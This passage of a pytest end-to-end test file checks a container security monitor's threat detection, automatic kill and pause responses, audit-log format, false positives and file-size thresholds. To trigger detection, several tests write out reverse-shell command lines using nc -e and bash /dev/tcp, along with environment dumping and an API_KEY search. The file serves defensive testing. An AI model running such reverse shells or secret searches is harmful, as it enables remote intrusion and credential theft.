                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            time.sleep(8)

            container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-19")

            if get_container_state(container_name) == "Unknown":
                proc.terminate()
                pytest.skip(f"Container {container_name} not found")

            # Inject malicious command - should be detected via config-enabled monitoring
            subprocess.Popen(
                [
                    "incus",
                    "exec",
                    container_name,
                    "--",
                    "sh",
                    "-c",
                    "exec -a 'nc -e /bin/bash 10.0.0.1 4444' sleep 30",
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            # Wait for detection and kill
            time.sleep(5)

            killed = False
            for _ in range(15):
                time.sleep(1)
                state = get_container_state(container_name)
                if state in ["Stopped", "Frozen"]:
                    killed = True
                    break

            assert killed, "Container should be killed when monitoring enabled via config"

            # Verify threat logged
            events = get_threat_events(container_name)
            critical = [e for e in events if e.get("level") == "critical"]
            assert len(critical) > 0, "Expected CRITICAL threat when config enables monitoring"

            proc.terminate()
            cleanup_container(container_name, coi_binary)

        finally:
            # Restore original config
            if backup:
                config_path.write_text(backup)
            elif config_path.exists():
                config_path.unlink()


class TestMultipleThreats:
    """Test handling of multiple simultaneous threats."""

    def test_multiple_simultaneous_threats(self, test_workspace, enable_monitoring, coi_binary):
        """Test that multiple threats are all detected and logged."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "20",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-20")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Inject multiple threats simultaneously
        # Threat 1: Reverse shell (CRITICAL)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'bash -i >& /dev/tcp/1.1.1.1/4444' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Threat 2: Environment scanning (WARNING)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'printenv' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Threat 3: API key search (WARNING)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'grep -r API_KEY /workspace' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for monitoring to detect all threats
        time.sleep(5)

        # Container should be killed (CRITICAL takes precedence)
        killed = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state in ["Stopped", "Frozen"]:
                killed = True
                break

        assert killed, "Container should be killed when CRITICAL threat present"

        # Verify all threats are logged
        events = get_threat_events(container_name)

        # Should have CRITICAL threat(s)
        critical = [e for e in events if e.get("level") == "critical"]
        assert len(critical) > 0, "Expected at least one CRITICAL threat"

        # May have WARNING threats too (depending on timing)
        # Don't assert on warnings count - they may or may not be detected before kill

        # Verify total events captured
        assert len(events) >= 1, "Expected at least one threat event"

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestAuditLogValidation:
    """Test audit log format and structure validation."""

    def test_audit_log_jsonl_format(self, test_workspace, enable_monitoring, coi_binary):
        """Verify audit log is valid JSONL with all required fields."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "21",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-21")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Trigger a threat to generate audit log entry
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'nc -e /bin/sh 10.0.0.1 9999' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for detection
        time.sleep(10)

        # Read audit log file directly
        log_path = Path.home() / ".coi" / "audit" / f"{container_name}.jsonl"
        assert log_path.exists(), "Audit log file should exist"

        # Parse and validate JSONL format
        with open(log_path) as f:
            lines = [line.strip() for line in f if line.strip()]
            assert len(lines) > 0, "Audit log should contain at least one event"

            for i, line in enumerate(lines):
                # Each line should be valid JSON
                try:
                    event = json.loads(line)
                except json.JSONDecodeError as e:
                    pytest.fail(f"Line {i + 1} is not valid JSON: {e}")

                # Verify required fields
                required_fields = [
                    "id",
                    "timestamp",
                    "level",
                    "category",
                    "title",
                    "description",
                    "action",
                ]
                for field in required_fields:
                    assert field in event, f"Missing required field '{field}' in event {i + 1}"

                # Verify field types
                assert isinstance(event["id"], str), "id should be string"
                assert isinstance(event["timestamp"], str), "timestamp should be string"
                assert isinstance(event["level"], str), "level should be string"
                assert isinstance(event["category"], str), "category should be string"
                assert isinstance(event["title"], str), "title should be string"
                assert isinstance(event["description"], str), "description should be string"
                assert isinstance(event["action"], str), "action should be string"

                # Verify level is valid
                assert event["level"] in ["info", "warning", "high", "critical"], (
                    f"Invalid threat level: {event['level']}"
                )

                # Verify action is valid
                assert event["action"] in ["logged", "alerted", "paused", "killed", "pending"], (
                    f"Invalid action: {event['action']}"
                )

                # Verify evidence field exists and has content
                assert "evidence" in event, "Missing evidence field"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_audit_log_evidence_structure(self, test_workspace, enable_monitoring, coi_binary):
        """Verify evidence data structure in audit log."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "22",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-22")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Trigger environment scanning (easier to verify evidence structure)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'env' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Get events
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]

        if len(warnings) == 0:
            # Detection might be timing-dependent, don't fail
            proc.terminate()
            cleanup_container(container_name, coi_binary)
            pytest.skip("No WARNING events detected (timing dependent)")

        # Verify evidence structure for process-based threats
        for event in warnings:
            evidence = event.get("evidence")
            assert evidence is not None, "Evidence should not be None"

            # For process threats, evidence should have these fields
            if event.get("category") == "environment":
                # Evidence should be a dict with process info
                assert isinstance(evidence, dict), "Evidence should be a dict for process threats"
                # Common fields: pid, command, user, pattern
                # Don't assert on specific fields as structure may vary

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestFalsePositives:
    """Test that legitimate commands don't trigger false alerts."""

    def test_legitimate_file_reads_no_alert(self, test_workspace, enable_monitoring, coi_binary):
        """Test that small file reads don't trigger false alerts."""
        # Create a small file (well below 50MB threshold)
        small_file = Path(test_workspace) / "data.txt"
        small_file.write_text("Some data\n" * 1000)  # ~10KB

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "23",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-23")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Read the small file - should NOT trigger
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "cat",
                "/workspace/data.txt",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait to see if it would be detected
        time.sleep(5)

        # Container should still be running (no false positive)
        state = get_container_state(container_name)
        assert state == "Running", f"Container should stay running on small file read, got {state}"

        # Check audit log - should have no HIGH threats for file reads
        events = get_threat_events(container_name)
        high_fs_threats = [
            e for e in events if e.get("level") == "high" and e.get("category") == "filesystem"
        ]
        assert len(high_fs_threats) == 0, "Small file read should not trigger HIGH threat"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_legitimate_nc_usage_no_alert(self, test_workspace, enable_monitoring, coi_binary):
        """Test that nc without -e flag doesn't trigger false alert."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "24",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-24")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Use nc for legitimate port listening (no -e, no network connection)
        # Just check if nc exists, don't actually listen
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "which nc || echo 'nc not found'",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Container should still be running
        state = get_container_state(container_name)
        assert state == "Running", (
            f"Container should stay running on legitimate nc check, got {state}"
        )

        # No CRITICAL threats should be logged for simple nc check
        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]

        # If any critical events, they shouldn't be about nc without -e
        for event in critical:
            desc = event.get("description", "").lower()
            # Should not flag nc without suspicious patterns
            assert "nc" not in desc or "-e" in desc or "tcp" in desc, (
                f"nc without -e or network shouldn't trigger: {desc}"
            )

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_python_import_socket_no_alert(self, test_workspace, enable_monitoring, coi_binary):
        """Test that importing socket without using it doesn't trigger."""
        # Create a script that imports socket but doesn't use it maliciously
        benign_script = Path(test_workspace) / "benign.py"
        benign_script.write_text(
            """#!/usr/bin/env python3
import socket
import time

# Just print something benign
print("Hello world")
time.sleep(2)
"""
        )
        benign_script.chmod(0o755)

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "25",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-25")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Run the benign script
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "python3",
                "/workspace/benign.py",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Container should still be running
        state = get_container_state(container_name)
        assert state == "Running", "Benign python script should not trigger alerts"

        # No CRITICAL reverse shell alerts
        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]

        # Reverse shell detection requires network activity, not just socket import
        reverse_shells = [e for e in critical if "reverse shell" in e.get("title", "").lower()]
        assert len(reverse_shells) == 0, (
            "Importing socket without network activity should not trigger"
        )

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_normal_build_operations_no_alert(self, test_workspace, enable_monitoring, coi_binary):
        """Test that normal development operations don't trigger alerts."""
        # Create a simple build script
        build_script = Path(test_workspace) / "build.sh"
        build_script.write_text(
            """#!/bin/bash
# Normal build operations
echo "Building..."
ls -la
cat package.json 2>/dev/null || echo "No package.json"
echo "Build complete"
"""
        )
        build_script.chmod(0o755)

        # Create a small package.json
        package_json = Path(test_workspace) / "package.json"
        package_json.write_text('{"name": "test", "version": "1.0.0"}')

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "26",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-26")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Run build script
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "/workspace/build.sh",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Container should still be running
        state = get_container_state(container_name)
        assert state == "Running", "Normal build operations should not trigger alerts"

        # No high-level threats from normal operations
        events = get_threat_events(container_name)
        high_or_critical = [e for e in events if e.get("level") in ["high", "critical"]]

        # Normal ls, cat, echo shouldn't trigger high/critical
        assert len(high_or_critical) == 0, (
            "Normal build operations should not trigger high/critical alerts"
        )

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestThresholdBoundaries:
    """Test detector behavior at threshold boundaries."""

    def test_file_read_below_threshold_no_alert(
        self, test_workspace, enable_monitoring, coi_binary
    ):
        """Test that reading 49MB (below 50MB threshold) doesn't trigger."""
        # Create a 49MB file (just below threshold)
        large_file = Path(test_workspace) / "data49mb.bin"
        # 49MB = 49 * 1024 * 1024 bytes
        large_file.write_bytes(b"A" * (49 * 1024 * 1024))

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "27",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-27")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Read the 49MB file
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "cat",
                "/workspace/data49mb.bin",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for potential detection
        time.sleep(10)

        # Container should still be running (below threshold)
        state = get_container_state(container_name)
        assert state == "Running", f"Container should stay running for <50MB read, got {state}"

        # No HIGH filesystem threats
        events = get_threat_events(container_name)
        high_fs = [
            e for e in events if e.get("level") == "high" and e.get("category") == "filesystem"
        ]
        assert len(high_fs) == 0, "49MB read should not trigger HIGH threat (threshold is 50MB)"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_file_read_at_threshold_triggers(self, test_workspace, enable_monitoring, coi_binary):
        """Test that reading exactly 50MB triggers HIGH threat."""
        # Create exactly 50MB file
        large_file = Path(test_workspace) / "data50mb.bin"
        large_file.write_bytes(b"B" * (50 * 1024 * 1024))

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "28",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-28")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Read the 50MB file
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "cat",
                "/workspace/data50mb.bin",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for detection and pause
        time.sleep(10)

        paused = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state == "Frozen":
                paused = True
                break

        assert paused, "Container should be paused on 50MB read (at threshold)"

        # Verify HIGH threat logged
        events = get_threat_events(container_name)
        high_fs = [
            e for e in events if e.get("level") == "high" and e.get("category") == "filesystem"
        ]
        assert len(high_fs) > 0, "50MB read should trigger HIGH filesystem threat"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_file_read_above_threshold_triggers(
        self, test_workspace, enable_monitoring, coi_binary
    ):
        """Test that reading 60MB (above threshold) triggers HIGH threat."""
        # Create 60MB file (well above threshold)
        large_file = Path(test_workspace) / "data60mb.bin"
        large_file.write_bytes(b"C" * (60 * 1024 * 1024))

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "29",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-29")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Read the 60MB file
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "cat",
                "/workspace/data60mb.bin",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for detection and pause
        time.sleep(10)

        paused = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state == "Frozen":
                paused = True
                break

        assert paused, "Container should be paused on 60MB read (above threshold)"

        # Verify HIGH threat logged
        events = get_threat_events(container_name)
        high_fs = [
            e for e in events if e.get("level") == "high" and e.get("category") == "filesystem"
        ]
        assert len(high_fs) > 0, "60MB read should trigger HIGH filesystem threat"

        proc.terminate()
        cleanup_container(container_name, coi_binary)


# These end-to-end tests verify all monitoring aspects:
# - Threat detection (reverse shells, env scanning, large file reads, network connections)
# - Reverse shell patterns (netcat, bash, python, perl, php)
# - Threat levels (CRITICAL, WARNING, HIGH)
# - Automated responses (auto-kill on CRITICAL, auto-pause on HIGH, alert-only on WARNING)
# - Audit logging with proper action tracking
# - Prompt injection scenarios (code inside container going rogue)
# - Configuration options (enabled, auto_pause_on_high, auto_kill_on_critical)
# - Monitoring disabled (negative test - no detection when disabled)
# - Network threats (C2 ports, metadata endpoint access)
#
# Tests use background shell processes and direct container command injection
# to avoid stdout/stderr blocking issues.
